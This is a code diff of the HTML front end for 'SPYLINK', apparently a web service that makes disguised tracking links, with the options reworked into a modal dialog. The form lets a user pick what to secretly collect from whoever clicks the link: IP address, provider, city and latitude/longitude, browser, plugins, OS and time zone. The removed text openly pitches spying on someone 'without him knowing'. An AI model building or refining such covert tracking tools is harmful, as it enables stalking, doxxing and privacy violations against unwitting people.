@@ -5,84 +5,166 @@
   <meta charset="UTF-8">
   <title>SPYLINK</title>
   <link rel="stylesheet" href="/static/style.css">
-  <link
-    rel="icon"
-    href="https://images-ext-1.discordapp.net/external/QKh5TGTwsUF8orvpuH7ewn9LWmiy8mUStsDY7kK76rM/%3Fsize%3D240/https/cdn.discordapp.com/banners/1154855315339214918/825c92c967246f5915b0d5c4aa8275cf.webp?format=webp"
-    type="image/png"
-  />
+  <style>
+    .container {
+      max-width: 600px;
+      margin: 3rem auto;
+      padding: 0 1rem;
+      text-align: center;
+    }
+    form > label,
+    form > input,
+    form > select,
+    form > button {
+      display: block;
+      width: 100%;
+      margin-bottom: 1rem;
+    }
+    form > button {
+      width: auto;
+      padding: 0.75rem 1.5rem;
+    }
+    /* Modal backdrop */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.7);
+      justify-content: center;
+      align-items: center;
+    }
+    .modal-content {
+      background: #fff;
+      border-radius: 8px;
+      width: 90%;
+      max-width: 500px;
+      max-height: 80%;
+      overflow-y: auto;
+      padding: 1.5rem;
+    }
+    .modal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 1rem;
+    }
+    .modal-header h2 {
+      margin: 0;
+      font-size: 1.25rem;
+    }
+    .close-modal {
+      background: none;
+      border: none;
+      font-size: 1.5rem;
+      cursor: pointer;
+    }
+    .modal-body fieldset {
+      border: none;
+      margin: 1rem 0;
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(140px,1fr));
+      gap: 0.5rem;
+    }
+    .modal-body legend {
+      font-weight: bold;
+      grid-column: 1 / -1;
+      margin-bottom: 0.5rem;
+    }
+    .modal-body label {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-size: 0.9rem;
+    }
+    .modal-footer {
+      text-align: right;
+      margin-top: 1rem;
+    }
+    .modal-footer button {
+      margin-left: 0.5rem;
+      padding: 0.5rem 1rem;
+    }
+  </style>
 </head>
 <body>
   <div class="container">
     <h1>SPYLINK</h1>
     <p class="subtitle">
-      You want to locate someone? You want to find someone's IP address? You would like to know what version of Windows a friend is using or his computer configuration, without him knowing? Easy! Create a spy link in 4 clicks and send it to the person you want to spy on. As soon as the person clicks the link, you will immediately and discreetly receive his private information in your mail box.
+      Create a spy link in 2 clicks. When they click it, you get their info.
     </p>
 
     <form method="post" action="/create">
-      <label>1) Redirect the spy link to the website:</label>
-      <input type="text" name="target_url" placeholder="http://youtube.com" required>
+      <label>1) Redirect the spy link to:</label>
+      <input type="text" name="target_url" placeholder="https://example.com" required>
 
       <label>2) Choose a URL shortener:</label>
       <select name="shortener">
         <option value="random">Random</option>
       </select>
 
-      <label>3) Enter your email address:</label>
-      <input type="email" name="email" placeholder="you@example.com" required>
+      <button type="button" id="openOptions">Options</button>
 
-      <label>4) Select info to capture:</label>
+      <!-- Options Modal -->
+      <div class="modal" id="optionsModal">
+        <div class="modal-content">
+          <div class="modal-header">
+            <h2>Select Info to Capture</h2>
+            <button class="close-modal" id="closeOptions">&times;</button>
+          </div>
+          <div class="modal-body">
+            <fieldset>
+              <legend>Network</legend>
+              <label><input type="checkbox" name="capture_ip"> IP address</label>
+              <label><input type="checkbox" name="capture_host"> Host</label>
+              <label><input type="checkbox" name="capture_provider"> Provider</label>
+              <label><input type="checkbox" name="capture_proxy"> Proxy</label>
+            </fieldset>
+            <fieldset>
+              <legend>Geolocation</legend>
+              <label><input type="checkbox" name="capture_continent"> Continent</label>
+              <label><input type="checkbox" name="capture_country"> Country</label>
+              <label><input type="checkbox" name="capture_region"> Region</label>
+              <label><input type="checkbox" name="capture_city"> City</label>
+              <label><input type="checkbox" name="capture_latlong"> Lat/Long</label>
+            </fieldset>
+            <fieldset>
+              <legend>Browser</legend>
+              <label><input type="checkbox" name="capture_browser"> Browser</label>
+              <label><input type="checkbox" name="capture_cookies"> Cookies</label>
+              <label><input type="checkbox" name="capture_flash"> Flash</label>
+              <label><input type="checkbox" name="capture_java"> Java</label>
+              <label><input type="checkbox" name="capture_plugins"> Plugins</label>
+            </fieldset>
+            <fieldset>
+              <legend>System</legend>
+              <label><input type="checkbox" name="capture_os"> OS</label>
+              <label><input type="checkbox" name="capture_resolution"> Resolution</label>
+              <label><input type="checkbox" name="capture_localtime"> Local Time</label>
+              <label><input type="checkbox" name="capture_timezone"> Time Zone</label>
+            </fieldset>
+          </div>
+          <div class="modal-footer">
+            <button type="button" id="selectAll">Select All</button>
+            <button type="button" id="doneOptions">Done</button>
+          </div>
+        </div>
+      </div>
 
-      <fieldset>
-        <legend>Network information</legend>
-        <label><input type="checkbox" name="capture_ip"      /> IP address</label>
-        <label><input type="checkbox" name="capture_host"    /> Host</label>
-        <label><input type="checkbox" name="capture_provider" /> Access Provider Name</label>
-        <label><input type="checkbox" name="capture_proxy"   /> Proxy detection</label>
-      </fieldset>
-
-      <fieldset>
-        <legend>Geographical information</legend>
-        <label><input type="checkbox" name="capture_continent" /> Continent</label>
-        <label><input type="checkbox" name="capture_country"   /> Country</label>
-        <label><input type="checkbox" name="capture_region"    /> Region</label>
-        <label><input type="checkbox" name="capture_city"      /> City</label>
-        <label><input type="checkbox" name="capture_latlong"   /> Latitude/Longitude</label>
-      </fieldset>
-
-      <fieldset>
-        <legend>Browser information</legend>
-        <label><input type="checkbox" name="capture_browser"   /> Browser name and version</label>
-        <label><input type="checkbox" name="capture_cookies"   /> Cookies activated or not</label>
-        <label><input type="checkbox" name="capture_flash"     /> Flash installed + version</label>
-        <label><input type="checkbox" name="capture_java"      /> Java activated or not</label>
-        <label><input type="checkbox" name="capture_plugins"   /> Installed Plug-ins</label>
-      </fieldset>
-
-      <fieldset>
-        <legend>System information</legend>
-        <label><input type="checkbox" name="capture_os"           /> OS name and version</label>
-        <label><input type="checkbox" name="capture_resolution"   /> Screen resolution</label>
-        <label><input type="checkbox" name="capture_localtime"    /> Local date and time</label>
-        <label><input type="checkbox" name="capture_timezone"     /> Time zone</label>
-      </fieldset>
-
-      <!-- new button to select everything -->
-      <button type="button" id="selectAllOptions">Select All Options</button>
-      <!-- main submit -->
       <button type="submit">CREATE MY SPY LINK</button>
     </form>
-
-    <p><a href="#">Become a Premium member right away to take advantage of all our options!</a></p>
   </div>
 
-  <!-- keep-alive ping every 10 seconds -->
   <script>
-    setInterval(() => fetch('/ping').catch(() => {}), 10 * 1000);
-
-    // Select-all script
-    document.getElementById('selectAllOptions').addEventListener('click', () => {
-      document.querySelectorAll('input[type="checkbox"]').forEach(cb => cb.checked = true);
-    });
+    setInterval(() => fetch('/ping').catch(() => {}), 10000);
+    const modal = document.getElementById('optionsModal');
+    document.getElementById('openOptions').onclick = () => modal.style.display = 'flex';
+    document.getElementById('closeOptions').onclick =
+    document.getElementById('doneOptions').onclick = () => modal.style.display = 'none';
+    document.getElementById('selectAll').onclick = () =>
+      modal.querySelectorAll('input[type="checkbox"]').forEach(cb => cb.checked = true);
+    window.onclick = e => { if (e.target === modal) modal.style.display = 'none'; };
   </script>
 </body>
 </html>
